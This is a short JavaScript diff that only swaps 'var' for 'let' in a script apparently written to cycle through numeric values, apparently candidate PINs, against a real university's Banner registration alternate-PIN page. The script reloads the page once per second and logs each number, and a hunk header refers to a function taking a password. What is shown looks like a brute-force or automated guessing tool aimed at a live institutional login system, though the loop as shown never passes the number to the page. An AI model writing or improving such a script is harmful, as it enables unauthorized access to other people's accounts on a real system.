@@ -10,14 +10,14 @@ function stuff (password) {
 }
 
 function wait (ms) {
-  var start = new Date().getTime()
-  var end = start
+  let start = new Date().getTime()
+  let end = start
   while (end < start + ms) {
     end = new Date().getTime()
   }
 }
 
-for (var i = 396250; i < 396265; i++) {
+for (let i = 396250; i < 396265; i++) {
   this.document.location = 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin'
   console.log(i)
   wait(1000)
